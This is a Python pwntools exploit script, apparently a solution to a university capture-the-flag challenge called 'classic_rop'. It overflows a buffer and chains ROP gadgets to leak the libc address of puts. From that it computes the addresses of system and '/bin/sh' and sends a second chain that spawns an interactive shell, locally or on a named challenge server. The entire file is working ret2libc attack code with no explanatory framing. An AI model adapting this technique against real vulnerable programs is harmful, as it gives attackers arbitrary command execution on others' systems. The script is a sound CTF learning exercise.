from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./classic_rop"

LOCAL = True

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # continue
    # ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1202)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

libc_elf = ELF(libc, checksec=False)
target_elf = ELF(target_file, checksec=False)
target_rop = ROP(target_file, checksec=False)

# Get our rop gadgets
rdi_gadget = target_rop.rdi
print(f"Found RDI gadget at {hex(rdi_gadget.address)}")
ret_gadget = target_rop.ret
print(f"Found RET gadget at {hex(ret_gadget.address)}")

# puts plt address
puts_plt_address = target_elf.plt.puts
print(f"Found puts plt address at {hex(puts_plt_address)}")
# get the GOT address of puts
puts_got_address = target_elf.got.puts
print(f"Found puts got address at {hex(puts_got_address)}")

# get the address of main
main_address = target_elf.symbols.main
print(f"Found main address at {hex(main_address)}")

# get the offset into main
main_offset_into = len(asm("""
endbr64
push rbp
"""))

print(f'Main and offset into main: {hex(main_address + main_offset_into)}')
# Leak the address of puts
# Send the puts GOT address to leak the puts address
p.recvuntil(b'ROP!\n')
bof_len = b"73"
p.sendline(bof_len)


chain = [
    rdi_gadget.address,
    puts_got_address,
    puts_plt_address,
    main_address + main_offset_into
]

# target_rop.call(puts_plt_address, [puts_got_address])
# target_rop.call(main_address + main_offset_into)
# p.send(b"A" * 0x28 + target_rop.chain())
p.send(b"A" * 0x28 + b"".join([p64(c) for c in chain]))

# if all goes well, we should get a response from the binary with a puts address

# now we send the rop gadget to leak the address of puts
puts_address_raw = p.recvline().strip()
puts_address = u64(puts_address_raw.ljust(8, b"\x00"))
print(f'puts address: {hex(puts_address)}')

# lets get the base address
puts_offset = libc_elf.symbols.puts
base_address = puts_address - puts_offset

# lets get the system address
system_address = libc_elf.symbols.system + base_address
print(f'system address: {hex(system_address)}')
bin_sh_address = next(libc_elf.search(b"/bin/sh")) + base_address
print(f'bin sh address: {hex(bin_sh_address)}')

p.recvuntil(b'ROP!\n')
# send the number of bytes to overflow
p.sendline(bof_len)

chain = [
    rdi_gadget.address,
    bin_sh_address,
    system_address
]

p.send(b"A" * 0x28 + b"".join([p64(c) for c in chain]))


p.interactive()
